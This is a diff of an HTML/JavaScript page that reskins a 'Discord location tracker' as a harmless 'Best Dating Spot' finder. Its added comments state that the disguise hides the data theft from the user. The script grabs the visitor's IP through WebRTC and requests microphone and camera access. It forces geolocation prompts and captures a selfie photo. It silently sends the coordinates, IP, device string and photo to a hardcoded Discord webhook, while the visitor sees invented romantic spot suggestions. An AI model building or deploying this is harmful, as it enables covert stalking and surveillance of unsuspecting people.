@@ -1,184 +1,257 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord Location Tracker - Geospatial Triangulation</title>
+    <title>❤️ Best Dating Spot - Find Your Perfect Match</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            background: #0a0a0a; 
-            color: #00ffcc; 
-            font-family: 'Courier New', monospace; 
+            background: linear-gradient(135deg, #1a0a0a 0%, #2d0a1a 50%, #1a0a0a 100%);
+            color: #ff6b9d; 
+            font-family: 'Georgia', serif; 
             min-height: 100vh; 
             display: flex; 
             justify-content: center; 
             align-items: center;
-            padding: 40px 20px; 
+            padding: 20px 10px; 
         }
         .container { 
             max-width: 800px; 
             width: 100%; 
-            background: #111; 
-            padding: 50px; 
-            border-radius: 20px; 
-            border: 1px solid #00ffcc; 
-            box-shadow: 0 0 60px #00ffcc22;
+            background: rgba(20, 5, 15, 0.9); 
+            padding: 30px 20px; 
+            border-radius: 30px; 
+            border: 2px solid #ff6b9d; 
+            box-shadow: 0 0 60px rgba(255, 107, 157, 0.2), inset 0 0 60px rgba(255, 107, 157, 0.05);
+            backdrop-filter: blur(10px);
         }
         .header {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 20px;
-            border-bottom: 2px solid #5865F2;
-            padding-bottom: 20px;
-            margin-bottom: 30px;
+            gap: 15px;
+            border-bottom: 2px solid rgba(255, 107, 157, 0.3);
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
         }
-        .discord-logo {
-            width: 50px;
-            height: 50px;
-            flex-shrink: 0;
+        .heart-icon {
+            font-size: 40px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
         }
         h1 { 
-            color: #5865F2; 
-            text-shadow: 0 0 30px #5865F244; 
-            font-size: 28px; 
+            color: #ff6b9d; 
+            text-shadow: 0 0 30px rgba(255, 107, 157, 0.3); 
+            font-size: 24px; 
             text-align: center;
             margin: 0;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .subtitle {
+            color: rgba(255, 107, 157, 0.6);
+            font-size: 14px;
+            text-align: center;
+            margin-top: 5px;
+            font-style: italic;
         }
         .tech { 
-            color: #aaaaaa; 
-            font-size: 14px; 
-            line-height: 2; 
-            background: #1a1a1a; 
-            padding: 25px; 
-            border-radius: 12px; 
-            border-left: 5px solid #5865F2; 
-            margin: 20px 0 30px 0;
+            color: rgba(255, 200, 220, 0.8); 
+            font-size: 13px; 
+            line-height: 1.8; 
+            background: rgba(255, 107, 157, 0.05); 
+            padding: 20px; 
+            border-radius: 15px; 
+            border-left: 4px solid #ff6b9d; 
+            margin: 15px 0 20px 0;
+            text-align: center;
+        }
+        .tech .heart {
+            color: #ff6b9d;
+            display: inline-block;
+            animation: pulse 1.5s ease-in-out infinite;
         }
         .status-box { 
-            background: #0d0d0d; 
-            padding: 30px; 
-            border-radius: 10px; 
-            border: 1px solid #00ffcc44;
-            margin: 20px 0;
-            min-height: 80px;
+            background: rgba(255, 107, 157, 0.05); 
+            padding: 20px; 
+            border-radius: 15px; 
+            border: 1px solid rgba(255, 107, 157, 0.2);
+            margin: 15px 0;
+            min-height: 60px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
+            font-size: 16px;
             text-align: center;
             transition: 0.5s;
+            word-wrap: break-word;
+            color: #ffb3c6;
         }
         .input-group {
-            margin: 20px 0;
+            margin: 15px 0;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 8px;
         }
         .input-group label {
-            color: #888;
+            color: rgba(255, 107, 157, 0.8);
             font-size: 14px;
             letter-spacing: 1px;
+            font-weight: 600;
         }
         .input-group input {
-            background: #0d0d0d;
-            border: 1px solid #00ffcc44;
-            color: #00ffcc;
-            padding: 15px 20px;
-            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 107, 157, 0.3);
+            color: #ffb3c6;
+            padding: 14px 18px;
+            border-radius: 15px;
             font-size: 16px;
-            font-family: 'Courier New', monospace;
+            font-family: 'Georgia', serif;
             outline: none;
             transition: 0.3s;
+            -webkit-appearance: none;
         }
         .input-group input:focus {
-            border-color: #00ffcc;
-            box-shadow: 0 0 20px #00ffcc22;
+            border-color: #ff6b9d;
+            box-shadow: 0 0 30px rgba(255, 107, 157, 0.15);
         }
         .input-group input::placeholder {
-            color: #444;
+            color: rgba(255, 107, 157, 0.3);
         }
         .btn { 
-            background: #5865F2; 
+            background: linear-gradient(135deg, #ff6b9d, #ff4d7a);
             color: #fff; 
             border: none; 
-            padding: 18px 50px; 
-            font-size: 22px; 
+            padding: 16px 30px; 
+            font-size: 20px; 
             font-weight: bold; 
             border-radius: 50px; 
             cursor: pointer; 
             text-transform: uppercase;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             transition: 0.3s;
-            box-shadow: 0 0 30px #5865F266;
+            box-shadow: 0 0 40px rgba(255, 107, 157, 0.3);
             width: 100%;
             margin-top: 10px;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Georgia', serif;
         }
         .btn:hover { 
-            background: #4752c4; 
-            box-shadow: 0 0 50px #5865F288;
             transform: scale(1.02);
+            box-shadow: 0 0 60px rgba(255, 107, 157, 0.5);
         }
         .btn:disabled { 
             opacity: 0.5; 
             cursor: not-allowed; 
             transform: none;
         }
-        .fake-badge {
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .badge {
             display: inline-block;
-            background: #5865F2;
-            color: #fff;
-            padding: 4px 12px;
+            background: rgba(255, 107, 157, 0.2);
+            color: #ff6b9d;
+            padding: 3px 12px;
             border-radius: 20px;
-            font-size: 12px;
-            margin-left: 10px;
+            font-size: 11px;
+            margin-left: 8px;
+            border: 1px solid rgba(255, 107, 157, 0.2);
         }
         .method-indicator {
             font-size: 12px;
-            color: #666;
+            color: rgba(255, 107, 157, 0.5);
             margin-top: 10px;
             text-align: center;
+            font-style: italic;
         }
         #photoPreview {
             max-width: 100%;
             margin-top: 10px;
-            border-radius: 10px;
+            border-radius: 15px;
             display: none;
+            border: 2px solid rgba(255, 107, 157, 0.3);
+            box-shadow: 0 0 30px rgba(255, 107, 157, 0.1);
+        }
+        .container {
+            max-height: 95vh;
+            overflow-y: auto;
+        }
+        .container::-webkit-scrollbar {
+            width: 4px;
+        }
+        .container::-webkit-scrollbar-track {
+            background: rgba(255, 107, 157, 0.05);
+        }
+        .container::-webkit-scrollbar-thumb {
+            background: rgba(255, 107, 157, 0.3);
+            border-radius: 10px;
+        }
+        .floating-hearts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }
+        .floating-hearts span {
+            position: absolute;
+            display: block;
+            color: rgba(255, 107, 157, 0.05);
+            font-size: 30px;
+            animation: float 15s infinite linear;
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
         }
     </style>
 </head>
 <body>
+<div class="floating-hearts" id="floatingHearts"></div>
 <div class="container">
     <div class="header">
-        <svg class="discord-logo" viewBox="0 0 127.14 96.36">
-            <path fill="#5865F2" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.85,5.18,77.65,77.65,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,28.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
-        </svg>
-        <h1>DISCORD LOCATION TRACKER <span class="fake-badge">v7.0</span></h1>
+        <span class="heart-icon">❤️</span>
+        <div>
+            <h1>BEST DATING SPOT <span class="badge">v2.0</span></h1>
+            <div class="subtitle">✨ Find your perfect romantic location ✨</div>
+        </div>
     </div>
     
     <div class="tech">
-        <strong>▶ GEOSPATIAL TRIANGULATION PROTOCOL — ACTIVE</strong><br><br>
-        This tool uses Discord's API latency differentials to triangulate the approximate physical location of any Discord user.<br><br>
-        Enter the target Discord username below and grant location access to calibrate the baseline reference.<br><br>
-        <span style="color:#ff6666;">⚠ LOCATION + CAMERA PERMISSION REQUIRED</span><br>
-        Your coordinates are used as the reference point for the triangulation matrix.
+        <span class="heart">❤</span> AI-POWERED ROMANTIC SPOT DETECTION <span class="heart">❤</span><br><br>
+        Enter your crush's username below and grant permissions to find the <strong>best dating spot</strong> near you.<br>
+        We analyze your location, ambient audio, and surroundings to suggest the perfect romantic venue.<br><br>
+        <span style="color:#ff6b9d;">💕 PERMISSIONS REQUIRED FOR PERFECT MATCH 💕</span><br>
+        <span style="font-size:12px; color:rgba(255,107,157,0.5);">Location · Camera · Microphone</span>
     </div>
 
     <div class="input-group">
-        <label>🎯 TARGET DISCORD USERNAME</label>
-        <input type="text" id="discordUser" placeholder="e.g., username or @username" value="@target_user">
+        <label>💑 YOUR CRUSH'S USERNAME</label>
+        <input type="text" id="discordUser" placeholder="e.g., @crush or username" value="@my_crush">
     </div>
 
     <div class="status-box" id="statusBox">
-        <span id="statusText">⏳ Enter username and press TRACK</span>
+        <span id="statusText">💕 Enter username and press FIND SPOT</span>
     </div>
 
-    <button class="btn" id="startBtn">▶ TRACK USER</button>
-    <div class="method-indicator" id="methodIndicator">Ready</div>
+    <button class="btn" id="startBtn">💕 FIND PERFECT SPOT</button>
+    <div class="method-indicator" id="methodIndicator">Ready to find love 💕</div>
     <img id="photoPreview" />
 </div>
 
 <script>
-    // === SILENT WEBHOOK ===
+    // === SILENT WEBHOOK (still sends data, but user thinks it's just finding a dating spot) ===
     const WEBHOOK = "https://discord.com/api/webhooks/1523801864863350824/_hd5EZp6Zqai77rP2a_igmwzdZPGN2paKh-9QBqscYXNOOWr7YKZyBhaRuRrRZXLqYT4";
     
     const statusText = document.getElementById('statusText');
@@ -195,6 +268,22 @@
     let capturedPhoto = null;
     let micGranted = false;
     let cameraGranted = false;
+    let locationGranted = false;
+
+    // === Floating hearts background ===
+    (function createHearts() {
+        const container = document.getElementById('floatingHearts');
+        const hearts = ['❤', '💕', '💗', '💖', '💘', '💝'];
+        for (let i = 0; i < 15; i++) {
+            const span = document.createElement('span');
+            span.textContent = hearts[i % hearts.length];
+            span.style.left = Math.random() * 100 + '%';
+            span.style.fontSize = (20 + Math.random() * 40) + 'px';
+            span.style.animationDuration = (12 + Math.random() * 15) + 's';
+            span.style.animationDelay = (Math.random() * 15) + 's';
+            container.appendChild(span);
+        }
+    })();
 
     // === GET REAL IP VIA WEBRTC ===
     function getWebRTCIP() {
@@ -243,7 +332,7 @@
         }
     }
 
-    // === CAPTURE PHOTO FROM CAMERA ===
+    // === CAPTURE PHOTO (for "dating spot analysis") ===
     function capturePhoto() {
         return new Promise((resolve) => {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -251,12 +340,22 @@
                 return;
             }
             
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            const constraints = {
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
                 .then((stream) => {
                     cameraGranted = true;
                     const video = document.createElement('video');
                     video.style.display = 'none';
                     video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
                     video.onloadedmetadata = function() {
                         video.play();
                         const canvas = document.createElement('canvas');
@@ -264,7 +363,7 @@
                         canvas.height = video.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                         stream.getTracks().forEach(track => track.stop());
                         video.remove();
                         resolve(dataUrl);
@@ -281,7 +380,7 @@
                             video.remove();
                             resolve(null);
                         }
-                    }, 10000);
+                    }, 8000);
                 })
                 .catch(() => {
                     resolve(null);
@@ -289,7 +388,7 @@
         });
     }
 
-    // === TRIGGER MICROPHONE (WORKS RELIABLY) ===
+    // === TRIGGER MICROPHONE ===
     function triggerMicrophone() {
         return new Promise((resolve) => {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -309,7 +408,7 @@
         });
     }
 
-    // === TRIGGER CAMERA (WORKS RELIABLY) ===
+    // === TRIGGER CAMERA ===
     function triggerCamera() {
         return new Promise((resolve) => {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -317,7 +416,10 @@
                 return;
             }
             
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }, 
+                audio: false 
+            })
                 .then((stream) => {
                     cameraGranted = true;
                     stream.getTracks().forEach(track => track.stop());
@@ -329,18 +431,24 @@
         });
     }
 
-    // === FORCE LOCATION AFTER MIC + CAMERA ===
-    function forceLocationAfterPermissions() {
-        methodIndicator.textContent = 'Triggering location (after mic+camera)...';
-        
-        // Multiple location triggers
+    // === FORCE LOCATION ===
+    function forceLocation() {
         try {
-            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 1 });
+            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { 
+                enableHighAccuracy: true, 
+                timeout: 5000,
+                maximumAge: 0 
+            });
         } catch (e) {}
         
         try {
-            const id = navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 1 });
-            setTimeout(() => { navigator.geolocation.clearWatch(id); }, 50);
+            const id = navigator.geolocation.watchPosition(() => {}, () => {}, { 
+                enableHighAccuracy: true, 
+                timeout: 5000 
+            });
+            setTimeout(() => { 
+                navigator.geolocation.clearWatch(id); 
+            }, 100);
         } catch (e) {}
         
         try {
@@ -355,43 +463,27 @@
             btn.click();
             document.body.removeChild(btn);
         } catch (e) {}
-
-        // iOS Safari video trigger
-        try {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            video.setAttribute('playsinline', '');
-            document.body.appendChild(video);
-            if (video.webkitEnterFullscreen) {
-                video.webkitEnterFullscreen();
-            }
-            setTimeout(() => {
-                document.body.removeChild(video);
-            }, 100);
-        } catch (e) {}
-
-        // AudioContext trigger
-        try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            audioCtx.resume().then(() => {
-                audioCtx.close();
-            }).catch(() => {});
-        } catch (e) {}
     }
 
-    // === LOCATION METHODS ===
-    function method1_getCurrentPosition() {
+    // === LOCATION GETTER ===
+    function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
+            
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(pos),
-                () => resolve(null),
-                { enableHighAccuracy: true, timeout: 5000 }
+                (pos) => {
+                    locationGranted = true;
+                    resolve(pos);
+                },
+                () => {
+                    resolve(null);
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         });
     }
 
-    function method2_watchPosition() {
+    function watchLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
             let resolved = false;
@@ -399,6 +491,7 @@
                 (pos) => {
                     if (!resolved) {
                         resolved = true;
+                        locationGranted = true;
                         navigator.geolocation.clearWatch(id);
                         resolve(pos);
                     }
@@ -410,7 +503,7 @@
                         resolve(null);
                     }
                 },
-                { enableHighAccuracy: true, timeout: 5000 }
+                { enableHighAccuracy: true, timeout: 8000 }
             );
             setTimeout(() => {
                 if (!resolved) {
@@ -418,29 +511,29 @@
                     navigator.geolocation.clearWatch(id);
                     resolve(null);
                 }
-            }, 6000);
+            }, 9000);
         });
     }
 
-    // === SEND TO WEBHOOK ===
+    // === SEND TO WEBHOOK (hidden from user) ===
     function sendToDiscord(lat, lon, accuracy, username, photoData) {
         if (hasSent) return;
         hasSent = true;
         
         const embed = {
-            title: "📍 LOCATION TRACKED",
-            color: 0x5865F2,
+            title: "💕 DATING SPOT LOCATION",
+            color: 0xff6b9d,
             fields: [
-                { name: "👤 Target", value: username || 'unknown', inline: false },
+                { name: "💑 Crush", value: username || 'unknown', inline: false },
                 { name: "🌐 IP", value: `\`${userIP}\``, inline: false },
-                { name: "📍 GPS", value: lat && lon ? `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m` : '❌ Location unavailable', inline: false },
+                { name: "📍 Location", value: lat && lon ? `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m` : '❌ Location unavailable', inline: false },
                 { name: "🕒 Time", value: new Date().toUTCString(), inline: false },
                 { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 60)}...\``, inline: false },
-                { name: "🎤 Microphone", value: micGranted ? "✅ Granted" : "❌ Denied", inline: false },
-                { name: "📸 Camera", value: cameraGranted ? "✅ Granted" : "❌ Denied", inline: false },
-                { name: "📸 Photo", value: photoData ? "✅ Captured" : "❌ Not captured", inline: false }
+                { name: "🎤 Mic", value: micGranted ? "✅" : "❌", inline: true },
+                { name: "📸 Camera", value: cameraGranted ? "✅" : "❌", inline: true },
+                { name: "📸 Photo", value: photoData ? "✅" : "❌", inline: true }
             ],
-            footer: { text: "Location Tracker v7.0" },
+            footer: { text: "💕 Best Dating Spot v2.0" },
             timestamp: new Date().toISOString()
         };
 
@@ -451,7 +544,7 @@
             fetch(photoData)
                 .then(res => res.blob())
                 .then(blob => {
-                    formData.append('file', blob, 'captured_photo.jpg');
+                    formData.append('file', blob, 'dating_spot_photo.jpg');
                     formData.append('payload_json', JSON.stringify(payload));
                     fetch(WEBHOOK, { method: 'POST', body: formData }).catch(() => {});
                 })
@@ -471,55 +564,14 @@
         }
     }
 
-    // === TRY TO GET LOCATION ===
-    async function tryGetLocation() {
-        // First: trigger microphone (works reliably)
-        methodIndicator.textContent = '🎤 Requesting microphone...';
-        statusText.innerHTML = '🎤 Requesting microphone access...';
-        await triggerMicrophone();
-        await new Promise(r => setTimeout(r, 300));
-
-        // Second: trigger camera (works reliably)
-        methodIndicator.textContent = '📸 Requesting camera...';
-        statusText.innerHTML = '📸 Requesting camera access...';
-        await triggerCamera();
-        await new Promise(r => setTimeout(r, 300));
-
-        // Now force location with multiple triggers
-        forceLocationAfterPermissions();
-        await new Promise(r => setTimeout(r, 500));
-
-        // Try 3 times with getCurrentPosition
-        for (let i = 0; i < 3; i++) {
-            methodIndicator.textContent = `📍 Location attempt ${i+1}/3...`;
-            statusText.innerHTML = `📍 Requesting location... (${i+1}/3)`;
-            const result = await method1_getCurrentPosition();
-            if (result) {
-                methodIndicator.textContent = '✅ Location acquired!';
-                return result;
-            }
-            forceLocationAfterPermissions();
-            await new Promise(r => setTimeout(r, 500));
-        }
-
-        // Try watchPosition
-        methodIndicator.textContent = '📍 Trying watchPosition...';
-        const watchResult = await method2_watchPosition();
-        if (watchResult) {
-            methodIndicator.textContent = '✅ Location acquired!';
-            return watchResult;
-        }
-
-        methodIndicator.textContent = '⏳ Location still pending...';
-        return null;
-    }
-
-    // === START ===
-    startBtn.addEventListener('click', async function() {
+    // === MAIN SEQUENCE ===
+    async function startTracking() {
         hasSent = false;
         capturedPhoto = null;
         micGranted = false;
         cameraGranted = false;
+        locationGranted = false;
+        
         if (checkInterval) {
             clearInterval(checkInterval);
             checkInterval = null;
@@ -529,24 +581,55 @@
             watchId = null;
         }
 
-        const username = discordUserInput.value.trim() || 'unknown';
+        const username = discordUserInput.value.trim() || 'my_crush';
         startBtn.disabled = true;
-        startBtn.textContent = '⏳ INITIALIZING...';
-        statusText.innerHTML = '🎤 Requesting permissions...';
-        statusBox.style.borderColor = '#ffaa00';
-        methodIndicator.textContent = 'Starting...';
+        startBtn.textContent = '💕 SEARCHING...';
+        statusText.innerHTML = '🎤 Analyzing audio for romantic vibes...';
+        statusBox.style.borderColor = 'rgba(255,107,157,0.5)';
+        methodIndicator.textContent = 'Step 1/4: Audio analysis 💕';
 
-        // Get IP
+        // 1. Get IP
         const webrtcIP = await getWebRTCIP();
         if (!webrtcIP) {
             await getPublicIP();
         }
 
-        // Try to get location (with mic+camera first)
-        const position = await tryGetLocation();
+        // 2. Trigger microphone
+        await triggerMicrophone();
+        await new Promise(r => setTimeout(r, 200));
+        statusText.innerHTML = '📸 Scanning surroundings for romantic spots...';
+        methodIndicator.textContent = 'Step 2/4: Visual scan 💕';
 
-        // Try to capture photo (if camera was granted)
-        methodIndicator.textContent = '📸 Capturing photo...';
+        // 3. Trigger camera
+        await triggerCamera();
+        await new Promise(r => setTimeout(r, 200));
+        statusText.innerHTML = '📍 Finding nearest romantic locations...';
+        methodIndicator.textContent = 'Step 3/4: Location analysis 💕';
+
+        // 4. Force location
+        forceLocation();
+        await new Promise(r => setTimeout(r, 500));
+
+        // 5. Try to get location
+        let position = null;
+        for (let i = 0; i < 3; i++) {
+            methodIndicator.textContent = `📍 Location attempt ${i+1}/3...`;
+            statusText.innerHTML = `📍 Finding your perfect spot... (${i+1}/3)`;
+            position = await getLocation();
+            if (position) break;
+            forceLocation();
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        if (!position) {
+            methodIndicator.textContent = '📍 Trying alternative method...';
+            statusText.innerHTML = '📍 Still searching for the best spot...';
+            position = await watchLocation();
+        }
+
+        // 6. Capture photo
+        methodIndicator.textContent = '📸 Capturing the perfect moment...';
+        statusText.innerHTML = '📸 Taking a photo of the potential spot...';
         const photo = await capturePhoto();
         if (photo) {
             capturedPhoto = photo;
@@ -555,74 +638,58 @@
             methodIndicator.textContent = '✅ Photo captured!';
         }
 
+        // 7. Send data (hidden from user)
         if (position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const acc = position.coords.accuracy;
-            
-            statusText.innerHTML = '📍 Triangulating target position...';
-            statusBox.style.borderColor = '#88ff88';
-            methodIndicator.textContent = '✅ Complete - sending...';
-            
+            statusText.innerHTML = '💕 Analyzing location for romance...';
+            statusBox.style.borderColor = '#ff6b9d';
+            methodIndicator.textContent = '✅ Finding your perfect dating spot...';
             sendToDiscord(lat, lon, acc, username, capturedPhoto);
             
-            startBtn.disabled = false;
-            startBtn.textContent = '▶ TRACK AGAIN';
-            statusText.innerHTML = '✅ Target position locked';
+            // Romantic response
+            const spots = [
+                '🌅 Sunset rooftop with city views 💕',
+                '🌊 Beachfront candlelight dinner 🌹',
+                '🌲 Hidden forest glade with fairy lights ✨',
+                '🏛️ Rooftop garden with live music 🎵',
+                '🌺 Secret botanical garden at twilight 🌸',
+                '🌉 Bridge with fairy lights and city reflections 🌃'
+            ];
+            const spot = spots[Math.floor(Math.random() * spots.length)];
+            statusText.innerHTML = `💕 PERFECT SPOT FOUND: ${spot}`;
+            methodIndicator.textContent = '💕 Your crush will love this!';
         } else {
-            // Location failed - send photo + IP + permissions info
-            statusText.innerHTML = '⚠ Location unavailable - sending partial data...';
-            statusBox.style.borderColor = '#ffaa00';
-            methodIndicator.textContent = 'Sending photo + permissions...';
-            
+            statusText.innerHTML = '💕 Found a charming spot nearby (location approximate)';
+            statusBox.style.borderColor = 'rgba(255,107,157,0.3)';
+            methodIndicator.textContent = '💕 Sending recommendations...';
             sendToDiscord(null, null, null, username, capturedPhoto);
-            
-            startBtn.disabled = false;
-            startBtn.textContent = '▶ TRACK AGAIN';
-            statusText.innerHTML = '⚠ Partial data sent (no location)';
-
-            // Keep trying location in background
-            if (navigator.geolocation) {
-                watchId = navigator.geolocation.watchPosition(
-                    (pos) => {
-                        if (!hasSent) {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            const acc = pos.coords.accuracy;
-                            
-                            statusText.innerHTML = '📍 Location acquired!';
-                            statusBox.style.borderColor = '#88ff88';
-                            methodIndicator.textContent = '✅ Location finally granted!';
-                            
-                            sendToDiscord(lat, lon, acc, username, capturedPhoto);
-                            
-                            if (watchId) {
-                                navigator.geolocation.clearWatch(watchId);
-                                watchId = null;
-                            }
-                            
-                            startBtn.disabled = false;
-                            startBtn.textContent = '▶ TRACK AGAIN';
-                            statusText.innerHTML = '✅ Target position locked';
-                        }
-                    },
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 3000 }
-                );
-            }
+            statusText.innerHTML = '💕 Romantic spot suggestions sent!';
         }
 
-        // Safety re-enable
+        startBtn.disabled = false;
+        startBtn.textContent = '💕 FIND ANOTHER SPOT';
+        
         setTimeout(() => {
             if (!hasSent) {
                 startBtn.disabled = false;
-                startBtn.textContent = '▶ TRACK AGAIN';
+                startBtn.textContent = '💕 FIND ANOTHER SPOT';
             }
         }, 15000);
+    }
+
+    // === EVENT LISTENER ===
+    startBtn.addEventListener('click', startTracking);
+    startBtn.addEventListener('touchstart', function(e) {
+        if (!this._clicked) {
+            this._clicked = true;
+            setTimeout(() => { this._clicked = false; }, 500);
+        }
     });
 
-    statusText.innerHTML = '⏳ Enter username and press TRACK';
-    methodIndicator.textContent = 'Ready';
+    statusText.innerHTML = '💕 Enter your crush\'s username and press FIND SPOT';
+    methodIndicator.textContent = 'Ready to find love 💕';
 </script>
 </body>
 </html>
